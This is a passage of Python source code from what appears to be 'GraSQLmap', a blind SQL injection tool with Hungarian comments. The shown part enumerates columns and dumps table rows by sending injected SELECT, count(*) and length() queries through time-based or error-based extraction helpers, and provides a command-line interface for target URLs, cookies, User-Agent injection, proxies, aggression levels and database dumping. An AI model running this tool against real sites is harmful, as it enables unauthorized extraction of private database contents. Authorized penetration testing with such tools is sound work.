    db_alap_q(tableN,"Table(s)","table_name"," FROM "+inFromTable,True)
    print('---')
    print("Tables:")
    print(tabulate(tableNames, headers=['table_name'], tablefmt='orgtbl'))
    print('---')

def column_q(): #lekérdezett vagy megadott tábla alapján mező lekérdezések
    #global dbname
    #global defaultdb
    #global defDBt
    #global tablename
    #global inSpace
    print(' --< Table query ]--[ ')
    runparams()
    tableN = 1
    ot = 0
    print("Database      ["+dbname+"]")
    print("Table         ["+tablename+"]")
    resS = lenFind_sqliType("SELECT count(*) FROM "+inFromColumn+" WHERE table_schema='"+dbname+"' and table_name='"+tablename+"'")
    logki(logInfo,'Col(s) num: '+resS)
    colN = int(resS)
    db_alap_q(colN,"Col(s)","column_name"," FROM "+inFromColumn+" WHERE table_schema='"+dbname+"' and table_name='"+tablename+"'",True)
    print('---')
    print("Column name(s):")
    print(tabulate(colNameList, headers=['column_name'], tablefmt='orgtbl'))
    print('---')
    tableDic = []
#mezők alapján érték lekrdezések
    resS = '0'
    for tryN in range(1,4+1):
        inneRest = dbname+"."+tablename
        if tryN == 2:
            inneRest = dbname+".`"+tablename+"`"
        if tryN == 3:
            inneRest = defaultdb+"."+tablename
        if tryN == 4:
            inneRest = defaultdb+".`"+tablename+"`"
        logki(logDebug,'Table try nr#'+str(tryN)+': '+inneRest)
        resS = lenFind_sqliType("SELECT count(*) FROM "+inneRest)
        if resS != '0':
            break
    rowN = int(resS)
    logki(logInfo,'Row(s) num: '+resS)
    for os in range(0,rowN):
        progress(logDebug,"Row(s)",os+1,rowN)
        oneRow = []
        for oc in range(0,colN):
            resS = ''
            resS = lenFind_sqliType("SELECT length("+colNames[oc]+") FROM "+inneRest+" LIMIT "+str(os)+",1")
            logki(logTrace,'Field len: '+resS)
            resN = int(resS)
            resS = charFind_sqliType("SELECT "+colNames[oc]+" FROM "+inneRest+" LIMIT "+str(os)+",1", resN)
            logki(logDebug,resS)
            logki(logDebug,'---')
            if resS == ' ':
                print('No more rows.')
                break
            oneRow.append(resS)
        print(oneRow)
        tableDic.append(oneRow)
    print('---')
    print('Datas:')
    print(tabulate(tableDic, headers=colNames, tablefmt='orgtbl'))
    print('---')

def runparams():
    #global verbVar
    #global pURL
    #global method
    #global defDBt
    #global inSpace
    print("Verbose level ["+logLevels[verbVar]+"]")
    print("URL           ["+pURL+"]")
    print("Method        ["+method+"]")
    print("Submethod     ["+subMethod+"]")
    print("SQLi type     ["+SQLI_TYPE[sqliType]+"]")
    if subMethod == 'tests...':
        print("Aggression    ["+AGGR_LVL[aggression]+"]")
        print("stopAfter     ["+str(stopAfter)+"]")
    #print("URL           ["+pURL+"]")
    logki(logDebug,"Cookie        ["+sutike+"]")
    logki(logDebug,"User-Agent    ["+useUserAgent+"]")
    logki(logDebug,"Force defDB   ["+str(defDBt)+"]")
    logki(logDebug,"Space         ["+inSpace+"]")
    logki(logDebug,"ParamHead     ["+preVar+"]")
    logki(logDebug,"ParamLeft     ["+paramLeft+"]")
    logki(logDebug,"ParamRight    ["+paramRight+"]")
    logki(logDebug,"ParamTail     ["+restVar+"]")
    logki(logDebug,"UserAgentData ["+pvUserAgentData+"]")

def main():
    global sutike
    global useUserAgent
    dispDeltaStart('szo')
    print(' --< GraSQLmap ]--[ ')

    parser = argparse.ArgumentParser()
    parser.add_argument("-u","--url",help="Input an url.",type=str)
    parser.add_argument("-up","--url_port",help="Input a portnumber for url (default = 80).",type=int)
    parser.add_argument("-df","--dirfile",help="Url ending [/dir]/file.",type=str)
    parser.add_argument("-m","--method",help="Call method. (default = GET )",type=str)
    parser.add_argument("-sm","--sub_method",help="Call sub method. (GET [default 0 - GETPARAM, 1 - GETSTRING, 2 - GETDIRECT]; POST [default 0 - POSTDATA, 1 - USERAGENT, 2 - COOKIEMOD])",type=int)
    parser.add_argument("--ssl",action='store_true')
    parser.add_argument("-p","--proxy_http",help="Input a http proxy",type=str)
    parser.add_argument("-ps","--proxy_https",help="Input a https proxy",type=str)

    parser.add_argument("--test",help="Payload test run (paramters needed).",action='store_true')
    parser.add_argument("--info",help="Default functions call.",action='store_true')
    parser.add_argument("--dbs",help="Query for reachable DBs (schemas).",action='store_true')
    parser.add_argument("-D","--databases",help="Selected DB (schema) name.",type=str)
    parser.add_argument("--tables",help="Query for reachable tables.",action='store_true')
    parser.add_argument("--forcedefdb",help="In case you want to use defultdb() function rather DB name.",action='store_true')
    parser.add_argument("-T","--table",help="Selected table name.",type=str)
    parser.add_argument("--dump",help="Selected table: -T dump in selected DB: -D.",action='store_true')

    parser.add_argument("-st","--sqli_type",help="Input SQLi type (default 0 - time-based, 1 - error-based).",type=int)
    parser.add_argument("-rt","--response_time",help="Delay time in second. (default 1, 1 -> 5 )",type=int)
    parser.add_argument("-rs","--response_size",help="Response limit size (kb)",type=int)
    parser.add_argument("-v","--verbose",default=0,help="Verbose level. INFO=0, DEBUG=1, TRACE=2, ALL=3",type=int)
    parser.add_argument("-ag","--aggr_level",help="Input aggression level (default 0 - Normal, 1 - Power, 2 - Extreme, 3 - Insane).",type=int)
    parser.add_argument("-stp","--stop_after",help="Stop after n findings (default 10, max. 100).",type=int)

    parser.add_argument("-ph","--paramshead",help="Paramter/Payloadstring before payload.",type=str)
    parser.add_argument("-sp","--space",help="Space replacement char(s).",type=str)
    parser.add_argument("-pt","--paramstail",help="Paramter/Payloadstring after payload.",type=str)
    parser.add_argument("-uad","--useragent_data",help="In case Useragent method, POST data.",type=str)
    parser.add_argument("-uag","--user_agent",help="User-Agent value.",type=str)
    parser.add_argument("-ck","--cookie",help="Cookie value.",type=str)

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit()
    args = parser.parse_args()

    global method
    global subMethod
    global urlVar
    global pURL
    global tablename
    global defaultdb
    global dbname
    global http_proxy
    global https_proxy
    global proxyDict
    global dSec
    global verbVar
    global inSpace

    global protVar
    global hostVar
    global portVar
    global urlEnd
    global preVar
    global restVar
    global pvUserAgentData

    global defDBt

    global sqliType
    global limitSize
    global aggression
    global stopAfter

    global szoStart

    canGo = True

    if(args.proxy_http):
            if(args.proxy_https):
                    proxyDict["http"]=args.proxy_http
            else:
                    proxyDict["http"]=args.proxy_http
                    proxyDict["https"]=args.proxy_http
    if(args.proxy_https):
            proxyDict["https"]=args.proxy_http
    if(args.ssl):
            protVar = 'https://'
            portVar = ':443'
    if(args.response_time):
            dSec=args.response_time
            if dSec < 1:
                dSec = 1
            if dSec > 5:
                dSec = 5
    if(args.response_size):
            limitSize=args.response_size
    if(args.sqli_type):
            sqliType=args.sqli_type
            if sqliType < 0:
                sqliType = 0
            if sqliType > 1:
                sqliType = 1
            if(sqliType == 1):
                if not(args.response_size):
                   print("For -st (sqli_type) 2, You must input response size limit -rs (response_size)!")
                   canGo = False
    if(args.verbose):
            #logging.basicConfig(level=log_levels[args.verbosity])
            verbVar=args.verbose
            if verbVar < 0:
                verbVar = 0
            if verbVar > 3:
                verbVar = 3
    if(args.aggr_level):
            #logging.basicConfig(level=log_levels[args.verbosity])
            aggression=args.aggr_level
            if aggression < 0:
                aggression = 0
            if aggression > 3:
                aggression = 3
    if(args.stop_after):
            #logging.basicConfig(level=log_levels[args.verbosity])
            stopAfter=args.stop_after
            if stopAfter <= 1:
                stopAfter = 1
            if stopAfter >= 100:
                stopAfter = 100
    if not(args.url):
        print("Missing ULR!")
        canGo = False
    if(args.method):
        method=args.method
        if(args.sub_method):
            if method == 'GET':
                subMethod = GETMETHODS[args.sub_method]
            if method == 'POST':
                subMethod = POSTMETHODS[args.sub_method]
        else:
            if method == 'GET':
                subMethod = GETMETHODS[GET_PARAM]
            if method == 'POST':
                subMethod = POSTMETHODS[POST_DATA]
        if subMethod == POSTMETHODS[USER_AGENT]:
            if not(args.useragent_data):
                print("In case USERAGENT need input -uad (useragent_data) POST call data row")
                canGo = False
    if(canGo):
            dispDeltaStart('app')
            if(args.url_port):
                    portVar=':'+str(args.url_port)
            if(args.space):
                    inSpace=args.space
            if(args.cookie):
                    sutike=args.cookie
            if(args.user_agent):
                    useUserAgent=args.user_agent
            if(args.dirfile):
                    urlEnd=args.dirfile
            if(args.paramshead):
                    preVar=args.paramshead
                    setParam(preVar)
            if(args.paramstail):
                    restVar=args.paramstail
            pvUserAgentData=preVar+restVar
            if(args.useragent_data):
                    pvUserAgentData=args.useragent_data
            hostVar = args.url
            urlVar = protVar+args.url+portVar
            #print(urlVar)
            pURL = urlVar+urlEnd
            logki(logTrace,'Cookie: '+sutike)
            setHeader(sutike, useUserAgent)

            if(args.dbs==None and args.databases==None and args.tables==None):
                    print("Missing parameters, use --help or --test, --info, --dbs switches.")
            if(args.databases):
                    dbname=args.databases
            if(args.table):
                    tablename=args.table
            if(args.test):
                    testRun()
            if(args.info):
                    info_q()
            if(args.dbs):
                    schema_q()
            if(args.tables):
                    if(args.forcedefdb):
                            defDBt = True

                    if(args.databases):
                            table_q()
                    else:
                            print("Must input DB name (-D)!")
            if(args.table):
                    if(args.dump):
                            column_q()
                            #data_q()
            dispDeltaStop('app')

    quit()

if __name__ == "__main__":
    main()
